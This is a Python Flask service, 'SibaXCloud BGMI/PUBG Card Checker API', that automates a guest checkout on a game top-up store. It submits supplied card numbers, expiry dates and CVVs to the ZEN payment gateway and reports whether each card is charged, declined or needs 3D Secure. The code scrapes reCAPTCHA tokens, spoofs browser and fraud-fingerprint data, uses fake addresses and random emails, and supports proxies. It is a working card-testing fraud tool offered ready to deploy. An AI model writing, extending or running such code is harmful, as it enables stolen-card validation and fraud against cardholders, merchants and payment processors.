# main.py - Full Working Version
import os
import base64
import requests
import re
import json
import random
import string
import time
import uuid
import logging
from urllib.parse import urljoin
from flask import Flask, request, jsonify
from flask_cors import CORS

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)

# ═══════════════════════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════════════════════

BASE = "https://gameseal.com"
PRODUCT_SLUG = "pubg-mobile-60-uc-unknown-cash-direct-top-up-global"
PRODUCT_ID = "019bd77df6647139b46f487ba5a59509"

ADDRESS = {
    "street": "-Not-specified-",
    "postal_code": "00-000",
    "city": "-Not-specified-",
    "country_id": "a9ad9f2a583b4e258d911f0164109fef",
}

SALUTATION_ID = "cff3f5378c004217b7924137dc4d2789"
PAYMENT_METHOD_ID = "018e80175b3c7345b87e04248d87c021"
FIELDSET_ID = "019bea273e3172e99f8de1bfb2a99c29"

RECAPTCHA_SITEKEY = "6Ldp1ckkAAAAAFO5g616r_vvFaihGgKkWut3cBli"
RECAPTCHA_CO = "aHR0cHM6Ly9nYW1lc2VhbC5jb206NDQz"

CREATOR = "@babapakodumal ( Supreme Leader )"

STATUS_MESSAGES = {
    "CHARGED": "Payment successful! Amount charged.",
    "DECLINED": "Your card was declined by the bank.",
    "3DS": "3D Secure authentication required. Manual intervention needed.",
    "PENDING": "Payment is pending processing.",
    "ERROR": "An error occurred during payment processing."
}


# ═══════════════════════════════════════════════════════════════════════════════
# PROXY SUPPORT
# ═══════════════════════════════════════════════════════════════════════════════

def get_proxy_dict(proxy_url):
    if not proxy_url or proxy_url.strip() == "":
        return None
    proxy_url = proxy_url.strip()
    if not proxy_url.startswith(("http://", "https://", "socks4://", "socks5://")):
        proxy_url = "http://" + proxy_url
    return {"http": proxy_url, "https": proxy_url}


def create_session_with_proxy(proxy_url=None):
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    })
    if proxy_url:
        proxy_dict = get_proxy_dict(proxy_url)
        if proxy_dict:
            session.proxies.update(proxy_dict)
            logger.info(f"Proxy enabled: {proxy_url}")
    return session


# ═══════════════════════════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════════════════════════

def parse_card(cc_str):
    parts = cc_str.strip().split("|")
    if len(parts) != 4:
        return None
    number, month, year, cvv = parts
    month = month.strip().zfill(2)
    year = year.strip()
    if len(year) == 2:
        year = "20" + year
    return {
        "number": number.strip(),
        "month": month,
        "year": year,
        "cvv": cvv.strip(),
    }


def validate_player_id(player_id):
    if not player_id:
        return None
    player_id = player_id.strip()
    if player_id.isdigit() and 8 <= len(player_id) <= 15:
        return player_id
    return None


def random_email():
    name = ''.join(random.choices(string.ascii_lowercase, k=8))
    return f"{name}{random.randint(100, 9999)}@gmail.com"


def extract_csrf(html):
    patterns = [
        r'name="csrf[_-]token"\s+(?:content|value)="([^"]+)"',
        r'value="([^"]+)"\s+name="csrf[_-]token"',
        r'name="_csrf_token"\s+(?:content|value)="([^"]+)"',
        r'"csrfToken":\s*"([^"]+)"',
    ]
    for p in patterns:
        m = re.search(p, html, re.IGNORECASE)
        if m:
            return m.group(1)
    return None


def get_recaptcha_token(session):
    try:
        resp = session.get(
            f"https://www.recaptcha.net/recaptcha/api.js?render={RECAPTCHA_SITEKEY}",
            headers={"Referer": f"{BASE}/"},
            timeout=30
        )
        v_match = re.search(r"releases/([^/]+)/recaptcha", resp.text)
        if not v_match:
            return None
        v = v_match.group(1)

        anchor_url = (
            f"https://www.recaptcha.net/recaptcha/api2/anchor"
            f"?ar=1&k={RECAPTCHA_SITEKEY}&co={RECAPTCHA_CO}&hl=en&v={v}&size=invisible"
        )
        resp = session.get(anchor_url, headers={"Referer": f"{BASE}/"}, timeout=30)
        m = re.search(r'id="recaptcha-token"\s+value="([^"]+)"', resp.text)
        if not m:
            return None

        resp = session.post(
            f"https://www.recaptcha.net/recaptcha/api2/reload?k={RECAPTCHA_SITEKEY}",
            data={
                "v": v,
                "reason": "q",
                "c": m.group(1),
                "k": RECAPTCHA_SITEKEY,
                "co": RECAPTCHA_CO,
                "hl": "en",
                "size": "invisible",
                "chr": "%5B89%2C64%2C27%5D",
                "vh": "13599012192",
                "bg": "",
            },
            headers={"Content-Type": "application/x-www-form-urlencoded", "Referer": anchor_url},
            timeout=30
        )
        rr = re.search(r'\["rresp","([^"]+)"', resp.text)
        return rr.group(1) if rr else None
    except Exception as e:
        logger.error(f"reCAPTCHA error: {e}")
        return None


# ═══════════════════════════════════════════════════════════════════════════════
# MAIN CHECK FUNCTION
# ═══════════════════════════════════════════════════════════════════════════════

def check_card(card, player_id, proxy_url=None):
    sess = create_session_with_proxy(proxy_url)
    
    cc = card["number"]
    exp = f"{card['month'].zfill(2)}{card['year'][-2:]}"
    cc_full = f"{cc}|{card['month']}|{card['year']}|{card['cvv']}"
    email = random_email()

    html_headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Upgrade-Insecure-Requests": "1",
    }

    try:
        # Homepage + Product
        logger.info("Fetching homepage...")
        sess.get(f"{BASE}/", headers={**html_headers, "Sec-Fetch-Site": "none"}, timeout=30)
        logger.info("Fetching product page...")
        sess.get(f"{BASE}/{PRODUCT_SLUG}", headers={**html_headers, "Referer": f"{BASE}/"}, timeout=30)

        # Validate Player ID
        logger.info(f"Validating player ID: {player_id}")
        validate_response = sess.post(
            f"{BASE}/topups/validate-fields",
            headers={
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Origin": BASE,
                "Referer": f"{BASE}/{PRODUCT_SLUG}",
            },
            json={"productId": PRODUCT_ID, "fields": {"playerid": player_id}},
            timeout=30
        )
        
        if validate_response.status_code != 200:
            return {
                "card": cc_full,
                "player_id": player_id,
                "gate": "Zen Payments - GameSeal",
                "status": "ERROR",
                "message": "Invalid Player ID or validation failed",
                "proxy_used": "true" if proxy_url else "false",
                "By": CREATOR
            }

        # Add to cart
        logger.info("Adding to cart...")
        boundary = f"----WebKitFormBoundary{''.join(random.choices(string.ascii_letters + string.digits, k=16))}"
        payload_json = json.dumps({
            "topupFields": {
                "playerid": {
                    "label": "Player ID",
                    "value": player_id,
                    "displayLabel": player_id
                }
            },
            "fieldsetId": FIELDSET_ID,
        })
        pid = PRODUCT_ID
        
        parts = [
            f'--{boundary}\r\nContent-Disposition: form-data; name="lineItems[{pid}][quantity]"\r\n\r\n1',
            f'--{boundary}\r\nContent-Disposition: form-data; name="redirectTo"\r\n\r\nfrontend.checkout.cart.page',
            f'--{boundary}\r\nContent-Disposition: form-data; name="redirectUrl"\r\n\r\n/checkout/cart',
            f'--{boundary}\r\nContent-Disposition: form-data; name="lineItems[{pid}][id]"\r\n\r\n{pid}',
            f'--{boundary}\r\nContent-Disposition: form-data; name="lineItems[{pid}][type]"\r\n\r\nproduct',
            f'--{boundary}\r\nContent-Disposition: form-data; name="lineItems[{pid}][referencedId]"\r\n\r\n{pid}',
            f'--{boundary}\r\nContent-Disposition: form-data; name="lineItems[{pid}][stackable]"\r\n\r\n1',
            f'--{boundary}\r\nContent-Disposition: form-data; name="lineItems[{pid}][removable]"\r\n\r\n1',
            f'--{boundary}\r\nContent-Disposition: form-data; name="platform-name"\r\n\r\nPUBG mobile',
            f'--{boundary}\r\nContent-Disposition: form-data; name="type-name"\r\n\r\nDirect Top-Up',
            f'--{boundary}\r\nContent-Disposition: form-data; name="product-name"\r\n\r\nPUBG Mobile 60 UC (Unknown Cash) Direct Top-Up - GLOBAL',
            f'--{boundary}\r\nContent-Disposition: form-data; name="brand-name"\r\n\r\nPUBG Mobile',
            f'--{boundary}\r\nContent-Disposition: form-data; name="dtgs-gtm-currency-code"\r\n\r\nEUR',
            f'--{boundary}\r\nContent-Disposition: form-data; name="dtgs-gtm-product-price"\r\n\r\n0.82',
            f'--{boundary}\r\nContent-Disposition: form-data; name="dtgs-gtm-product-sku"\r\n\r\nSW98189',
            f'--{boundary}\r\nContent-Disposition: form-data; name="atc_placement"\r\n\r\npdp-buynow',
            f'--{boundary}\r\nContent-Disposition: form-data; name="lineItems[{pid}][payload]"\r\n\r\n{payload_json}',
        ]
        body = '\r\n'.join(parts) + f'\r\n--{boundary}--\r\n'
        
        sess.post(
            f"{BASE}/checkout/line-item/add",
            headers={
                "Content-Type": f"multipart/form-data; boundary={boundary}",
                **html_headers,
                "Origin": BASE,
                "Referer": f"{BASE}/{PRODUCT_SLUG}",
            },
            data=body.encode(),
            allow_redirects=True,
            timeout=30
        )

        # Cart
        logger.info("Accessing cart...")
        sess.get(f"{BASE}/checkout/cart", headers={**html_headers, "Referer": f"{BASE}/{PRODUCT_SLUG}"}, timeout=30)

        # Register guest
        logger.info("Registering as guest...")
        recaptcha_token = get_recaptcha_token(sess)
        reg_data = {
            "redirectTo": "frontend.checkout.confirm.page",
            "redirectParameters": "",
            "errorRoute": "frontend.checkout.cart.page",
            "errorParameters": "",
            "email": email,
            "createCustomerAccount": "0",
            "acceptedDataProtection": "1",
            "salutationId": SALUTATION_ID,
            "firstName": "-Not-specified-",
            "lastName": "-Not-specified-",
            "billingAddress[street]": ADDRESS["street"],
            "billingAddress[zipcode]": ADDRESS["postal_code"],
            "billingAddress[city]": ADDRESS["city"],
            "billingAddress[countryId]": ADDRESS["country_id"],
        }
        if recaptcha_token:
            reg_data["_grecaptcha_v3"] = recaptcha_token

        resp = sess.post(
            f"{BASE}/account/register",
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                **html_headers,
                "Origin": BASE,
                "Referer": f"{BASE}/checkout/cart",
            },
            data=reg_data,
            allow_redirects=True,
            timeout=30
        )

        if resp.status_code == 403 or "/checkout/cart" in resp.url:
            return {
                "card": cc_full,
                "player_id": player_id,
                "gate": "Zen Payments - GameSeal",
                "status": "ERROR",
                "message": "Registration blocked (reCAPTCHA)",
                "proxy_used": "true" if proxy_url else "false",
                "By": CREATOR
            }

        # Configure checkout
        logger.info("Configuring checkout...")
        if "/checkout/confirm" not in resp.url:
            sess.get(
                f"{BASE}/checkout/confirm",
                headers={**html_headers, "Referer": f"{BASE}/account/register"},
                timeout=30
            )

        sess.post(
            f"{BASE}/checkout/configure",
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                **html_headers,
                "Origin": BASE,
                "Referer": f"{BASE}/checkout/confirm",
            },
            data={
                "redirectTo": "frontend.checkout.confirm.page",
                "redirectParameters": '{"redirected":0}',
                "countryGroup": ADDRESS["country_id"],
                "paymentMethodId": PAYMENT_METHOD_ID,
            },
            allow_redirects=True,
            timeout=30
        )

        # Place order
        logger.info("Placing order...")
        resp = sess.post(
            f"{BASE}/checkout/order",
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                **html_headers,
                "Origin": BASE,
                "Referer": f"{BASE}/account/order",
                "Cache-Control": "max-age=0",
            },
            data={
                "gs-street": ADDRESS["street"],
                "gs-postal-code": ADDRESS["postal_code"],
                "gs-city": ADDRESS["city"],
                "gs-country": ADDRESS["country_id"],
                "tos": "true",
                "GsNethoneSessionIdentifier": uuid.uuid4().hex,
            },
            allow_redirects=False,
            timeout=30
        )

        zen_url = None
        if resp.status_code in (301, 302, 303):
            zen_url = resp.headers.get("Location", "")
            if not zen_url.startswith("http"):
                zen_url = urljoin(BASE, zen_url)

        if not zen_url or "zen.com" not in zen_url:
            return {
                "card": cc_full,
                "player_id": player_id,
                "gate": "Zen Payments - GameSeal",
                "status": "ERROR",
                "message": "No ZEN redirect",
                "proxy_used": "true" if proxy_url else "false",
                "By": CREATOR
            }

        checkout_id = zen_url.rstrip("/").split("/")[-1].split("?")[0]
        logger.info(f"Checkout ID: {checkout_id}")

        # ZEN payment setup
        ZEN = "https://secure.zen.com"
        zh = {
            "Accept": "application/json",
            "Referer": f"{ZEN}/{checkout_id}",
            "Origin": ZEN,
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
        }

        sess.get(
            zen_url,
            headers={
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Referer": f"{BASE}/checkout/order",
            },
            timeout=30
        )

        sess.get(f"{ZEN}/api/checkouts/{checkout_id}/status", headers=zh, timeout=30)
        resp_checkout = sess.get(f"{ZEN}/api/v2/checkouts/{checkout_id}", headers=zh, timeout=30)
        checkout_data = resp_checkout.json() if resp_checkout.status_code == 200 else {}

        amount = checkout_data.get("amount", "0.82")
        currency = checkout_data.get("currency", "EUR")
        price_str = f"{amount} {currency}"

        # Get termsId
        channel_variant = "COR_MASTERCARD" if cc[0] == "5" else "COR_VISA"
        resp = sess.get(
            f"{ZEN}/api/v1/checkouts/{checkout_id}/available-payment-methods",
            headers=zh,
            params={"country": "PK", "offset": 0, "limit": 50},
            timeout=30
        )
        
        terms_id = None
        
        def find_terms(obj):
            if isinstance(obj, dict):
                if "termsId" in obj and obj["termsId"]:
                    return obj["termsId"]
                for v in obj.values():
                    r = find_terms(v)
                    if r:
                        return r
            elif isinstance(obj, list):
                for item in obj:
                    r = find_terms(item)
                    if r:
                        return r
            return None

        if resp.status_code == 200:
            terms_id = find_terms(resp.json())
        if not terms_id:
            terms_id = find_terms(checkout_data)
        if not terms_id:
            resp2 = sess.get(zen_url, headers={"Accept": "text/html", "Referer": f"{BASE}/"}, timeout=30)
            tm = re.search(r'termsId["\s:]+(["\'])([a-f0-9-]{36})\1', resp2.text)
            if tm:
                terms_id = tm.group(2)
        if not terms_id:
            terms_id = "fafb2ee2-93ba-496b-b3c3-ec1794a41fbe"

        # BIN check
        logger.info("Checking BIN...")
        sess.post(
            f"{ZEN}/api/checkouts/{checkout_id}/acquire-card-currency",
            headers={**zh, "Content-Type": "application/json"},
            json={"cardNumber": cc},
            timeout=30
        )

        # Submit payment
        logger.info("Submitting payment...")
        tm_session = str(uuid.uuid4())
        fp = json.dumps({
            "version": "1.4.1",
            "metadata": {},
            "data": [{"name": "THREATMETRIX", "value": tm_session}]
        })

        payload = {
            "channelCode": "PCL_CARD",
            "fraudFields": {
                "browserData": {
                    "availableScreenResolution": [1536, 816],
                    "colorDepth": 32,
                    "javaEnabled": False,
                    "language": "en-US",
                    "screenResolution": [1536, 864],
                    "timezone": "Asia/Karachi",
                    "timezoneOffset": -300,
                    "userAgent": sess.headers["User-Agent"],
                },
                "fingerPrintId": "ZEN;" + base64.b64encode(fp.encode()).decode(),
            },
            "cardPayment": {
                "cvv": card["cvv"],
                "number": cc,
                "expirationDate": exp
            },
            "aft": False,
            "channelVariant": channel_variant,
        }
        if terms_id:
            payload["termsId"] = terms_id

        resp = sess.post(
            f"{ZEN}/api/checkouts/{checkout_id}/payments",
            headers={**zh, "Content-Type": "application/json"},
            json=payload,
            timeout=30
        )

        if resp.status_code in (200, 201):
            result = resp.json()
            status = result.get("status", "UNKNOWN").upper()
            txn_id = result.get("id", result.get("transactionId", ""))
            detailed_message = result.get("message", STATUS_MESSAGES.get(status, "Unknown status"))

            if status == "PAYMENT_STARTED" and txn_id:
                time.sleep(2)
                summary_resp = sess.get(f"{ZEN}/api/checkouts/{checkout_id}/summary", headers=zh, timeout=30)
                summary = summary_resp.json() if summary_resp.status_code == 200 else {}

                def has_3ds(obj):
                    s = json.dumps(obj) if isinstance(obj, (dict, list)) else str(obj)
                    return "cardauth" in s or "threeds" in s.lower() or "3ds" in s.lower()

                if has_3ds(summary):
                    status = "3DS"
                    detailed_message = "3D Secure authentication required."
                else:
                    sess.patch(
                        f"{ZEN}/api/checkouts/{checkout_id}/payments/{txn_id}/redirect",
                        headers={**zh, "Content-Type": "application/json"},
                        json={},
                        timeout=30
                    )
                    for _ in range(10):
                        time.sleep(2)
                        sr = sess.get(f"{ZEN}/api/checkouts/{checkout_id}/status", headers=zh, timeout=30)
                        if sr.status_code == 200:
                            sd = sr.json()
                            new_status = sd.get("status", "")
                            if new_status == "PAYMENT_REJECTED":
                                status = "DECLINED"
                                detailed_message = sd.get("message", "Your card was declined.")
                                break
                            elif new_status == "PAYMENT_ACCEPTED":
                                status = "CHARGED"
                                detailed_message = "Payment successful!"
                                break
                            elif new_status not in ("", "PAYMENT_STARTED"):
                                status = new_status
                                detailed_message = sd.get("message", STATUS_MESSAGES.get(status, ""))
                                break

            mapped = {
                "PAYMENT_ACCEPTED": "CHARGED",
                "CHARGED": "CHARGED",
                "PAYMENT_REJECTED": "DECLINED",
                "DECLINED": "DECLINED",
                "3DS": "3DS",
                "PAYMENT_STARTED": "PENDING",
            }
            final_status = mapped.get(status, status)
            final_message = detailed_message if detailed_message else STATUS_MESSAGES.get(final_status, "Payment processed.")

            logger.info(f"Payment result: {final_status}")
            return {
                "card": cc_full,
                "player_id": player_id,
                "gate": "Zen Payments - GameSeal",
                "price": price_str,
                "status": final_status,
                "message": final_message,
                "proxy_used": "true" if proxy_url else "false",
                "By": CREATOR
            }

        elif resp.status_code in (400, 422):
            err = resp.json()
            errors = err.get("error", {}).get("errors", [])
            msg = errors[0].get("message", "") if errors else err.get("error", {}).get("message", "")
            return {
                "card": cc_full,
                "player_id": player_id,
                "gate": "Zen Payments - GameSeal",
                "price": price_str,
                "status": "DECLINED",
                "message": msg if msg else "Your card was declined.",
                "proxy_used": "true" if proxy_url else "false",
                "By": CREATOR
            }
        else:
            return {
                "card": cc_full,
                "player_id": player_id,
                "gate": "Zen Payments - GameSeal",
                "price": price_str,
                "status": "ERROR",
                "message": f"HTTP {resp.status_code} - Payment gateway error",
                "proxy_used": "true" if proxy_url else "false",
                "By": CREATOR
            }

    except Exception as e:
        logger.error(f"Error: {e}")
        return {
            "card": cc_full,
            "player_id": player_id,
            "gate": "Zen Payments - GameSeal",
            "status": "ERROR",
            "message": str(e),
            "proxy_used": "true" if proxy_url else "false",
            "By": CREATOR
        }


# ═══════════════════════════════════════════════════════════════════════════════
# API ENDPOINTS
# ═══════════════════════════════════════════════════════════════════════════════

@app.route('/', methods=['GET'])
def home():
    return jsonify({
        "service": "SibaXCloud BGMI/PUBG Card Checker API",
        "version": "2.0",
        "status": "running",
        "creator": CREATOR,
        "endpoints": {
            "health": "/health",
            "check_card": "/SibaXCloud/Id={player_id}/cc={cc}/proxy={proxy}",
            "simple_check": "/SibaXCloud/Id={player_id}/cc={cc}"
        }
    })


@app.route('/health', methods=['GET'])
def health():
    return jsonify({
        "status": "healthy",
        "service": "SibaXCloud API",
        "version": "2.0",
        "creator": CREATOR
    })


@app.route('/SibaXCloud/Id=<player_id>/cc=<path:cc>/proxy=<proxy_url>', methods=['GET', 'POST'])
def check_card_with_proxy(player_id, cc, proxy_url):
    validated_player_id = validate_player_id(player_id)
    if not validated_player_id:
        return jsonify({
            "status": "ERROR",
            "message": "Invalid player_id. BGMI/PUBG ID should be 8-15 digits only.",
            "By": CREATOR
        }), 400
    
    card = parse_card(cc)
    if not card:
        return jsonify({
            "status": "ERROR",
            "message": "Invalid card format. Use: number|mm|yyyy|cvv",
            "By": CREATOR
        }), 400
    
    proxy_to_use = None
    if proxy_url and proxy_url.strip() != "" and proxy_url.strip().lower() != "none":
        proxy_to_use = proxy_url.strip()
    
    result = check_card(card, validated_player_id, proxy_to_use)
    return jsonify(result)


@app.route('/SibaXCloud/Id=<player_id>/cc=<path:cc>', methods=['GET', 'POST'])
def check_card_without_proxy(player_id, cc):
    return check_card_with_proxy(player_id, cc, "")


@app.route('/SibaXCloud/check', methods=['GET', 'POST'])
def check_card_query():
    if request.method == 'GET':
        player_id = request.args.get('player_id')
        cc = request.args.get('cc')
        proxy_url = request.args.get('proxy', '')
    else:
        data = request.get_json() or {}
        player_id = data.get('player_id')
        cc = data.get('cc')
        proxy_url = data.get('proxy', '')
    
    if not player_id or not cc:
        return jsonify({
            "status": "ERROR",
            "message": "player_id and cc are required",
            "By": CREATOR
        }), 400
    
    return check_card_with_proxy(player_id, cc, proxy_url or "")


# ═══════════════════════════════════════════════════════════════════════════════
# RUN SERVER
# ═══════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    print("""
    ╔════════════════════════════════════════════════════════════════════════════╗
    ║                    SibaXCloud BGMI/PUBG Card Checker API                  ║
    ║                         Full Version - Ready for Render                    ║
    ╠════════════════════════════════════════════════════════════════════════════╣
    ║  Port: """ + str(port) + """
    ║  Creator: @babapakodumal (Supreme Leader)                                  ║
    ╚════════════════════════════════════════════════════════════════════════════╝
    """)
    app.run(host="0.0.0.0", port=port, debug=False)
